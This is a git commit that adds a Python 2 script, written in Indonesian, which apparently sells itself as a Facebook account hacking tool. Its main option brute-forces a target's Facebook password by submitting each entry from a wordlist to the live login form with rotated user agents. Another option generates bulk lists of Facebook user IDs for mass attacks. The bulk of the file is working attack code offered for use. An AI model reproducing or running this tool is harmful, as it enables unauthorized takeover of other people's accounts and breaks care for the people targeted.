00e840c2163b3057ca31dff3e092a55b6d73cb65
Ardi28 <ardi282003@gmail.com>
2019-05-06 00:42:33 +0700

    HackingFB

---
+++ HackingFB.py
@@ -0,0 +1,505 @@
+try:
+	######################## Danger!!!! #######################
+	import os
+	import time
+	import sys
+	import random
+	import mechanize
+	import cookielib
+	import os.path
+	import threading
+	import itertools
+	import getpass
+	
+	######################## Danger!!!! ######################
+except ImportError:
+	os.system("clear")
+        print ("  ")
+        print ("\033[1;31m [!] Import Gagal ( Mising Modules )")
+	print ("\033[1;31m [!] Tolong Hubungi pembuat")
+        print ("\033[1;31m [!] Whatsapp : 089638787729")
+	print ("\033[1;33m  >  ! Screenshot Sekarang !")
+        print ("    Kirim  Hasil  Screenshot")
+        print ("    Ke Nomer Whatsapp diatas")
+except NameError:
+	print (" \033[1;37m")
+        stop = True
+        sys.exit(0)
+
+try:
+	stop = False;
+	
+	def runtxt(s):
+	        for noobs in s + '\n':
+	                sys.stdout.write(noobs)
+                	sys.stdout.flush()
+        	        time.sleep(10. / 2100);
+	
+	
+	
+	info = """\033[1;37m\\	 		 	 			  /
+ \\		 			 	         /
+  \\              				        /
+   \\                                                   /
+\033[1;36m    +-------------------------------------------------+
+    |						      |
+    |              \033[1;32mAuthor  : Ardiansyah            \033[1;36m |
+    |            \033[1;32mMyTeam : Dark Force Army             \033[1;36m|
+    |         \033[1;32mTanggal Pembuatan : 28-01-2019          \033[1;36m|
+    |          \033[1;32mTerakhir Update : 03-03-2019           \033[1;36m|
+    |                    			      |
+    +-------------------------------------------------+""";
+	
+	
+	def exit():
+	    for c in itertools.cycle(['- ','\ ','| ','/ ','| ','\ ','| ','/ ']):
+	        if stop:
+	            break
+	        sys.stdout.write("\r\033[1;32m[+]\033[1;33m Exiting....." + c)
+	        sys.stdout.flush()
+	        time.sleep(0.07)
+	    sys.stdout.write("\r\033[1;32m[+] \033[1;33mThanks for using this tool, Byeee ...\n")
+	t = threading.Thread(target=exit);
+	
+	def haha():
+	    for c in itertools.cycle(['- ','\ ','| ','/ ','| ','\ ','| ','/ ']):
+	        if stop:
+	            break
+	        sys.stdout.write("\r\033[1;32m[+]\033[1;33m Loading....." + c)
+	        sys.stdout.flush()
+	        time.sleep(0.07)
+	    sys.stdout.write("\r\033[1;32m[+] \033[1;33mSukses ...\n")
+	z = threading.Thread(target=haha);
+	
+	def chu():
+	    for c in itertools.cycle(['- ','\ ','| ','/ ','| ','\ ','| ','/ ']):
+	        if stop:
+	            break
+	        sys.stdout.write("\r\033[1;32m[+]\033[1;33m Checking Update....." + c)
+	        sys.stdout.flush()
+	        time.sleep(0.07)
+	    sys.stdout.write("\r\033[1;32m[+] \033[1;33mChecking Update ...\n")
+	    print ("\033[1;32m |\033[1;32m");
+	    os.system("curl https://raw.githubusercontent.com/MR0KING/status/master/status");
+	    print ("\n \033[1;32m|");
+	    getpass.getpass("\033[1;32m[+]\033[1;37m Press Enter To Back !!!");
+	    os.system("python2 HackingFB.py")
+	u = threading.Thread(target=chu);
+
+	banner = """
+\a\a
+  \033[1;31m___________________________
+  \033[1;31m1011011011011[    ______   \\
+  \033[1;31m0101011100011[   ]      \   \\     \033[1;34mAuthor : MR.0KING
+  \033[1;31m101          [   ]      |   |     \033[1;34mTeam   : DARK FORCE
+  \033[1;31m001          [   ]______/   /     \033[1;34mBahasa : python
+  \033[1;31m1001011010010[             /      \033[1;34mNegara : Indonesia
+  \033[1;37m0011010101101[    ______   \\      \033[1;34mWa     : 089638787729\033[1;37m
+  101          [   ]      \   \\
+  110          [   ]      |   |
+  011          [   ]______/   /\033[1;31m ACCOUNT
+  \033[1;37m010          [_____________/  \033[1;37mHACKING...""";
+	daftar = """
+\033[1;31m            [-]=============================[-]
+             |   \033[1;32m 1.Hack Facebook Target     \033[1;31m|
+             |    \033[1;32m2.Hack Facebook Massal     \033[1;31m|
+             |        \033[1;32m3.ID Generator         \033[1;31m|
+             |         \033[1;32m4.Info Tools         \033[1;31m |
+             |         \033[1;32m0.Exit Tools          \033[1;31m|
+            [-]=============================[-]""";
+	
+	os.system("clear");
+	runtxt(banner);
+	
+	os.system("sleep 3");
+	print daftar;
+	os.system("sleep 2");
+	print (" ");
+	print ("\033[1;33m[-] \033[1;37mPilih No\033[1;33m");
+	pilih = raw_input (" \033[1;33m|->>\033[1;37m ");
+	if pilih == '0':
+		t.start()
+		time.sleep(2)
+		stop = True
+		os.system("cd")
+		time.sleep(1)
+		sys.exit(0)
+	elif pilih == '1':
+		z.start()
+	        time.sleep(2)
+	        stop = True
+	        os.system("cd");
+		time.sleep(1);
+		os.system("clear");
+		def runntek(s):
+		        for c in s + '\n':
+	        	        sys.stdout.write(c)
+		                sys.stdout.flush()
+	                	time.sleep(10. / 100)
+	
+		if sys.platform == "linux" or sys.platform == "linux2":
+		     GL = "\033[96;1m" # Blue aqua
+		     BB = "\033[34;1m" # Blue light
+		     YY = "\033[33;1m" # Yellow light
+		     GG = "\033[32;1m" # Green light
+		     WW = "\033[0;1m"  # White light
+		     RR = "\033[31;1m" # Red light
+		     CC = "\033[36;1m" # Cyan light
+		     B = "\033[34m"    # Blue
+		     Y = "\033[33;1m"    # Yellow
+		     G = "\033[32m"    # Green
+		     W = "\033[0;1m"     # White
+		     R = "\033[31m"    # Red
+		     C = "\033[36;1m"    # Cyan
+		     rand = (BB,YY,GG,WW,RR,CC)
+		     P = random.choice(rand)
+		def cover():
+		    print """
+		    
+		    
+		    
+		    
+		     """
+		    runntek(GL+"            ...............LoaDinG...............")
+		    time.sleep(1)
+		    print " "
+		    print RR+"       +============================================+"
+		    print GG+"       |>>>>>>>>   HACKS FACEBOOK ACCOUNT   <<<<<<<<|" 
+		    print RR+"       +============================================+"
+		    print WW+"       |             Tools By: MR.0KING             |"
+		    print GG+"       |      Berdoa Dulu Sebelum Menggunakan       |"
+		    print WW+"       |           Whatsapp: 089638787729           |"
+		    print Y+"       |              Life Of Progamer              |"
+		    print WW+"       |--------------------------------------------|"
+		    print GL+"       |          MR-CYBER TEAM  [ MR-CT ]          |"
+		    print WW+"       |--------------------------------------------|"
+		    print RR+"       +============================================+"
+		    print GG+"       |>>>>>>>>   HACKS FACEBOOK ACCOUNT   <<<<<<<<|"
+		    print RR+"       +============================================+"
+		    print " "
+		    time.sleep(5)
+		cover();
+		def paw():
+			print RR+"[!] Ketik (L)anjut Ketik (B)ack !!!"
+			stop = False
+			pil = str(raw_input(GG+"[?]=> "))
+			if pil == 'B' or pil == 'b':
+				getpass.getpass("\033[1;32m[+] \033[1;37mPress Enter To Back \033[1;31m!!!\033[1;37m");
+				t.start()
+				time.sleep(2)
+				stop = True
+				os.system("cd");
+				time.sleep(1)
+				os.system("clear")
+				os.system("python2 HackingFB.py")
+				sys.exit(0)
+			elif pil == 'L' or pil == 'l':
+				email = str(raw_input(GL+" [-] Masukkan ID Target\033[33;1m: "))
+				che = 0
+				while che < 1 :
+					passwordlist = str(raw_input(WW+" [-] Masukkan File Wordlist \033[95m[ password.txt ] \033[92;1m: "))
+					try:
+						f = open(passwordlist)
+						che = che + 1
+					except IOError:
+						print ("\r\033[1;31m [!] File Tidak Ada !!!")
+						print (" ")
+				#login = 'https://m.facebook.com/login/?ref=dbl&fl&refid=8'
+				
+				
+				login = 'https://www.facebook.com/login.php?login_attempt=1'
+				
+				
+				useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
+				
+				
+				def runntek(s):
+			        	for c in s + '\n':
+			                	sys.stdout.write(c)
+				                sys.stdout.flush()
+				                time.sleep(10. / 100)
+				
+				def main():
+				        global br
+		        		br = mechanize.Browser()
+			        	cj = cookielib.LWPCookieJar()
+				        br.set_handle_robots(False)
+			        	br.set_handle_redirect(True)
+				        br.set_cookiejar(cj)
+			        	br.set_handle_equiv(True)
+			        	br.set_handle_referer(True)
+				        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+				        welcome();
+		        		search();
+				        print " "
+        				runntek(RR+"  Wordlis Tidak Ada yang Cocok")
+	        			runntek(RR+"  Kalo Ada Kesalahan,Hubungi Pembuat")
+					runntek(RR+"  Kembangin Wordlistnya Sendiri")
+				        time.sleep(1)
+        				print WW+34*"  -"
+				        kol();
+				
+				def kol():
+				    nok = raw_input("Edit wordlist.? \033[96;1m[y/n]: ")
+				    if nok == "y":
+		        		print ("Silahkan tulis perintah \033[92;1m[ nano password.txt ] !")
+		        		print WW+(41*"-")
+				        print GL+(" ")
+				        os.sys.exit()
+				    else:
+				        exit(0)
+				def brute(password):
+				        sys.stdout.write(GG+"\r[+]\033[97;1m Mencoba ..... {}\n".format(password))
+			        	sys.stdout.flush()
+				        br.addheaders = [('User-agent', random.choice(useragents))]
+		        		site = br.open(login)
+		        		br.select_form(nr = 0)
+				        br.form['email'] = email
+				        br.form['pass'] = password
+	        			sub = br.submit()
+				        log = sub.geturl()
+				        if log != login and (not 'login_attempt' in log):
+		        		                print("\033[92;1m\n\n[+]\033[97;1m Password Find \033[31;1m===> \033[96;1m{}".format(password)) 
+	        	        		        print " "
+							stop = False
+							getpass.getpass("\033[1;32m[+] \033[1;37mPress Enter To Back \033[1;31m!!!\033[1;37m");
+			        			t.start()
+					        	time.sleep(2)
+						        stop = True
+					        	time.sleep(1)
+						        os.system("python2 HackingFB.py");
+							sys.exit(0)
+				
+				def search():
+				        global password
+	        			passwords = open(passwordlist,"r")
+		        		for password in passwords:
+		                		passwords = password.replace("\n","")
+			        	        brute(password)
+				
+				
+				#welcome
+				def welcome():
+		        		wel = GG+"""
+           __  _______   ____  __ _______   ________
+          /  |/  / __ \ / __ \/ // /  _/ | / / ____/
+         / /|_/ / /_/ // / / / /` // //  |/ / / __
+        / /  / / _, _// /_/ / , <`/ // /|  / /_/ /
+       /_/  /_/_/ |_(_)____/_/|_/___/_/ |_/\____/
+                       \033[96;4mMR-CYBER TEAM\033[92;1m
+	\033[1;0m
+	      """
+			        	
+					try:
+						print wel
+					        print " "
+			        		total = open(passwordlist,"r")
+					        total = total.readlines()
+				        	print " "
+			        		print GL+" [*] Account to crack : {}".format(email)
+				        	print RR+" [*] Jumlah :" , len(total),WW+ "passwords"
+				        	print Y+" [*] Cracking, please wait .....\n\n"
+					except IOError, e:
+					        print ("  ")
+					        print ("\r\033[1;31m [!] File Tidak Ada !!!")
+					        print (" ")
+						time.sleep(2)
+						stop = True
+						paw()
+				main();
+				paw();
+			else:
+				paw();
+		paw();
+	elif pilih == '2':
+		z.start()
+	        time.sleep(2)
+		stop = True
+	        os.system("cd")
+        	time.sleep(1);
+		os.system("clear");
+		os.system("python2 asal");
+		getpass.getpass("\033[1;32m[+] \033[1;37mPress Enter To Back \033[1;31m!!!\033[1;37m");
+        	stop = False
+	        t.start()
+        	time.sleep(2)
+	        stop = True
+        	time.sleep(1)
+	        os.system("python2 HackingFB.py");
+		sys.exit(0)
+	elif pilih == '4':
+		z.start()
+	        time.sleep(2)
+        	stop = True
+	        os.system("cd")
+        	time.sleep(1)
+		os.system("clear");
+		os.system("sh lambang");
+		os.system("sleep 2")
+		print info;
+		getpass.getpass("\033[1;32m[+] \033[1;37mPress Enter To Back \033[1;31m!!!\033[1;37m");
+        	stop = False
+	        t.start()
+        	time.sleep(2)
+	        stop = True
+        	time.sleep(1)
+	        os.system("python2 HackingFB.py");
+		sys.exit(0)
+	elif pilih == '3':
+		z.start()
+                time.sleep(2)
+                stop = True
+                os.system("cd")
+                time.sleep(1)
+                os.system("clear");
+		id = 100011111111111
+		banid =  """\033[1;31m
+    ididi  didididididi
+    didid  ididididididi
+    ididi  didid    didid   \033[1;32mAuthor    \033[1;34m: \033[1;33mMR.0KING
+\033[1;31m    didid  ididi     didid  \033[1;32mMy Team   \033[1;34m: \033[1;33mDark Force Army
+\033[1;31m    ididi  didid     didii  \033[1;32mWhatsapp  \033[1;34m: \033[1;33m089638787729
+\033[1;37m    didid  ididi     ididi  \033[1;32mThanks To \033[1;34m: \033[1;31m@\033[1;33mNaufal \033[1;31m@\033[1;33mMR.057
+\033[1;37m    ididi  didid     ididi              \033[1;31m@\033[1;33mIchiro dll
+\033[1;37m    didid  ididi    ididi
+    ididi  didididididid  \033[1;31mFacebook
+\033[1;37m    didid  idididididid  Generator
+"""
+		hub = """
+\033[1;31m                     ! \033[1;34mPEMBERITAHUAN \033[1;31m!
+\033[1;31m             Jika Anda Ingin Memiliki Banyak Id
+             Kamu Bisa Hubungi Pembuat Tool Ini
+          Bisa Hubungi Nomor Whatsapp Di Bawah Ini
+                        089638787729
+          \033[1;31m       ! \033[1;34mSegera Hubungi Pembuat \033[1;31m!
+"""
+		def mulid():
+			id = 100011111111111
+			for i in range(0, jumlah):
+	        		id = id + a
+			        print id
+		       		mas = "{}\n".format(id)
+			       	f = open(wordl, 'a')
+        			f.write(mas)
+			        f.close
+		runtxt(banid);
+		wordl = raw_input("\033[1;31m[\033[1;33m?\033[1;31m] \033[1;33mNama Wordlist \033[1;32m: \033[1;37m")
+		if wordl == 'ArdiGans' :
+		        jumlah = input("\033[1;31m[\033[1;33m?\033[1;31m] \033[1;33mJumlah \033[1;31m[ Unlimited ] \033[1;32m: \033[1;37m")
+		        if jumlah > 0:
+		                a = 1234
+				mulid()
+				getpass.getpass("\033[1;32m[+] \033[1;37mPress Enter To Back \033[1;31m!!!\033[1;37m");
+				stop = False
+		                t.start()
+		                time.sleep(2)
+		                stop = True
+                		time.sleep(1)
+		                os.system("python2 HackingFB.py");
+                		sys.exit(0)
+		        else:
+		                print hub
+				getpass.getpass("\033[1;32m[+] \033[1;37mPress Enter To Back \033[1;31m!!!\033[1;37m");
+				stop = False
+		                t.start()
+		                time.sleep(2)
+                		stop = True
+		                time.sleep(1)
+		                os.system("python2 HackingFB.py");
+		                sys.exit(0)
+		elif wordl == 'MR.0KING':
+		        jumlah = input("\033[1;31m[\033[1;33m?\033[1;31m] \033[1;33mJumlah \033[1;31m[ Max:10000 ] \033[1;32m: \033[1;37m")
+		        if jumlah < 10001:
+                		a = 3603
+				mulid()
+				getpass.getpass("\033[1;32m[+] \033[1;37mPress Enter To Back \033[1;31m!!!\033[1;37m");
+				stop = False
+		                t.start()
+                		time.sleep(2)
+		                stop = True
+                		time.sleep(1)
+		                os.system("python2 HackingFB.py");
+                		sys.exit(0)
+			else:
+                                print hub
+			        getpass.getpass("\033[1;32m[+] \033[1;37mPress Enter To Back \033[1;31m!!!\033[1;37m");
+                                stop = False
+                                t.start()
+                                time.sleep(2)
+                                stop = True
+                                time.sleep(1)
+                                os.system("python2 HackingFB.py");
+                                sys.exit(0)
+		jumlah = input("\033[1;31m[\033[1;33m?\033[1;31m] \033[1;33mJumlah \033[1;32m: \033[1;37m")
+		if jumlah < 101:
+		 	a = 200345
+		elif jumlah < 501:
+			a = 123004
+		elif jumlah < 1001:
+			a = 110023
+		elif jumlah < 5001:
+			a = 65007
+		else:
+			print hub
+			sys.exit()
+		id = 100011111111111
+		for i in range(0, jumlah):
+			id = id + a
+			print id
+			mas = "{}\n".format(id)
+			f = open(wordl, 'a')
+			f.write(mas)
+			f.close
+		getpass.getpass("\033[1;32m[+] \033[1;37mPress Enter To Back \033[1;31m!!!\033[1;37m");
+		stop = False
+		t.start()
+		time.sleep(2)
+		stop = True
+		time.sleep(1)
+		os.system("python2 HackingFB.py");
+		sys.exit(0)
+	elif pilih == '3738838383':
+		z.start()
+		time.sleep(2)
+		stop = True
+		os.system("cd")
+		time.sleep(1)
+		stop = False
+		u.start()
+		time.sleep(5)
+		stop = True
+		os.system("cd")
+		time.sleep(1);
+		sys.exit(0)
+	
+	else:
+		time.sleep(1)
+		stop = True
+		print ("  ");
+		print ("\033[1;31m [!] Pilih Yang Bener !!!");
+		print (" ");
+		time.sleep(2);
+		os.system("python2 HackingFB.py");
+		sys.exit(0)
+except KeyboardInterrupt:
+	print ("  ")
+        print ("\r\033[1;31m [!] Warning !!!")
+        print (" ")
+        time.sleep(1)
+	stop = True
+	time.sleep(1)
+        os.system("python2 HackingFB.py")
+        os.system("clear")
+        sys.exit(0)
+except ImportError:
+        os.system("clear")
+        print ("  ")
+        print ("\033[1;31m [!] Import Gagal ( Mising Modules )")
+        print ("\033[1;31m [!] Tolong Hubungi pembuat")
+        print ("\033[1;31m [!] Whatsapp : 089638787729")
+	print ("\033[1;33m  >  ! Screenshot Sekarang !")
+	print ("    Kirim  Hasil  Screenshot")
+	print ("    Ke Nomer Whatsapp diatas")
+except NameError:
+        print (" \033[1;37m")
+        stop = True
